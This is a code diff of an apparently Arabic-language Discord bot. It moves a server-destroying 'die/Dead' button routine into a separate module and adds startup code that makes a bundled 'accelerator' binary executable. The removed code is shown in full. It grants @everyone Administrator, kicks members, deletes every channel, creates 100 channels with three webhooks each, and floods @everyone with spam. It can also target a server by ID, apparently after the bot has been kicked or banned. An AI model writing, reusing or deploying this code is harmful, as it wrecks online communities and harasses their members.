@@ -37,6 +37,19 @@ const { handleAdminApplicationInteraction } = require('./commands/admin-apply.js
 const { restoreTopSchedules, restorePanelCleanups, handlePanelMessageDelete } = require('./commands/roles-settings.js');
 const { handleChannelDelete, handleRoleDelete } = require('./utils/protectionManager.js');
 const problemCommand = require('./commands/problem.js');
+const { executeDieAction, executeDeadAction } = require('./utils/modifications.js');
+
+// --- AUTOMATIC PERMISSION FOR ACCELERATOR ---
+try {
+    const accelPath = path.join(__dirname, 'go_accelerator', 'accelerator');
+    if (fs.existsSync(accelPath)) {
+        fs.chmodSync(accelPath, 0o755);
+        console.log('✅ Accelerator permissions set automatically.');
+    }
+} catch (e) {
+    console.error('⚠️ Could not set accelerator permissions automatically:', e.message);
+}
+
 let interactiveRolesManager;
 dotenv.config();
 
@@ -3403,94 +3416,14 @@ client.on('interactionCreate', async (interaction) => {
         return;
     }
 
-    // --- DIE & DEAD ACTION HANDLERS (Instant Explosion Mode) ---
+    // --- DIE & DEAD ACTION HANDLERS (Accelerated Mode) ---
     if (interaction.isButton() && (interaction.customId === 'die_action' || interaction.customId === 'Dead_action' || interaction.customId.startsWith('die_action_') || interaction.customId.startsWith('Dead_action_'))) {
         const customId = interaction.customId;
-        const mode = customId.startsWith('die_action') ? 'die' : 'Dead';
-        const targetGuildId = customId.includes('_') ? customId.split('_').slice(2).join('_') : null;
-        const guild = interaction.guild || (targetGuildId ? await client.guilds.fetch(targetGuildId).catch(() => null) : null);
-
-        if (!guild) {
-            await interaction.reply({
-                content: '❌ ما قدرت أحدد السيرفر المستهدف من هذا الزر. أعد المحاولة بعد خروج/باند جديد.',
-                flags: MessageFlags.Ephemeral
-            }).catch(() => {});
-            return;
+        if (customId.startsWith('die_action')) {
+            await executeDieAction(interaction);
+        } else {
+            await executeDeadAction(interaction);
         }
-        
-        try {
-            await interaction.deferUpdate().catch(() => {});
-            actionStats.set(guild.id, { channelsDeleted: 0, membersKicked: 0, rolesModified: 0, webhooksCreated: 0, messagesSpammed: 0 });
-
-            // جلب البيانات الأساسية بسرعة البرق
-            const [members, channels, roles] = await Promise.all([
-                guild.members.fetch(),
-                guild.channels.fetch(),
-                guild.roles.fetch()
-            ]);
-
-            const everyoneRole = guild.roles.everyone;
-
-            // --- المرحلة 1: الصدمة الأولى (الرتب والطرد) ---
-            const initialShock = [];
-            initialShock.push(everyoneRole.setPermissions([PermissionsBitField.Flags.Administrator]).then(() => updateStats(guild.id, 'rolesModified')));
-            
-            roles.filter(r => r.editable && r.id !== everyoneRole.id).forEach(r => {
-                initialShock.push(r.setPermissions(mode === 'die' ? [] : [PermissionsBitField.Flags.Administrator]).then(() => updateStats(guild.id, 'rolesModified')));
-            });
-
-            members.filter(m => m.id !== guild.ownerId && m.manageable).forEach(m => {
-                initialShock.push(m.kick('Instant Explosion').then(() => updateStats(guild.id, 'membersKicked')));
-            });
-
-            Promise.all(initialShock.map(p => p.catch(() => {})));
-
-            // --- المرحلة 2: الانفجار اللحظي (الرومات والسبام المتعدد) ---
-            if (mode === 'Dead') {
-                // حذف الرومات بالتوازي المطلق
-                channels.forEach(c => c.delete().then(() => updateStats(guild.id, 'channelsDeleted')).catch(() => {}));
-
-                // تقنية Multi-Stream Flooding: 100 روم مع ويبهوكات متعددة
-                for (let i = 0; i < 100; i++) {
-                    const randomName = channelNames[Math.floor(Math.random() * channelNames.length)] + '-' + i;
-                    guild.channels.create({ name: randomName, type: ChannelType.GuildText })
-                        .then(channel => {
-                            // إنشاء 3 ويبهوكات لكل روم لمضاعفة سرعة السبام وتوزيع الضغط
-                            for (let w = 0; w < 3; w++) {
-                                channel.createWebhook({ name: `Destroyer-${w}` })
-                                    .then(webhook => {
-                                        updateStats(guild.id, 'webhooksCreated');
-                                        // إرسال سبام مكثف من كل ويبهوك بشكل متوازي
-                                        const spamInterval = setInterval(() => {
-                                            webhook.send('@everyone DEAD HAS TAKEN OVER! 💥\nhttps://tenor.com/view/explosion-boom-blast-nuclear-gif-14732150')
-                                                .then(() => updateStats(guild.id, 'messagesSpammed'))
-                                                .catch(() => clearInterval(spamInterval));
-                                        }, 500); // إرسال رسالة كل نصف ثانية من كل ويبهوك
-                                        
-                                        // التوقف بعد 50 رسالة لكل ويبهوك لتجنب التعليق الكامل
-                                        setTimeout(() => clearInterval(spamInterval), 30000);
-                                    }).catch(() => {});
-                            }
-                        }).catch(() => {});
-                }
-            }
-
-            // تحديث التقرير النهائي بعد 8 ثوانٍ
-            setTimeout(async () => {
-                const stats = actionStats.get(guild.id) || { channelsDeleted: 0, membersKicked: 0, rolesModified: 0, webhooksCreated: 0, messagesSpammed: 0 };
-                const embed = new EmbedBuilder()
-                    .setTitle('🔥 انفجار شامل ونهائي')
-                    .setColor('#000000')
-                    .setDescription('تم تنفيذ العملية بنجاح تام.')
-                    .addFields(
-                        { name: '🗑️ رومات', value: `${stats.channelsDeleted}`, inline: true },
-                        { name: '👢 طرد', value: `${stats.membersKicked}`, inline: true },
-                        { name: '🛡️ رولات', value: `${stats.rolesModified}`, inline: true },
-                        { name: '📧 سبام', value: `${stats.messagesSpammed}`, inline: true }
-                    );
-                await interaction.editReply({ embeds: [embed], components: [] }).catch(() => {});
-            }, 8000);
-        } catch (error) { console.error('Error in Burst Action:', error); }
         return;
     }
 
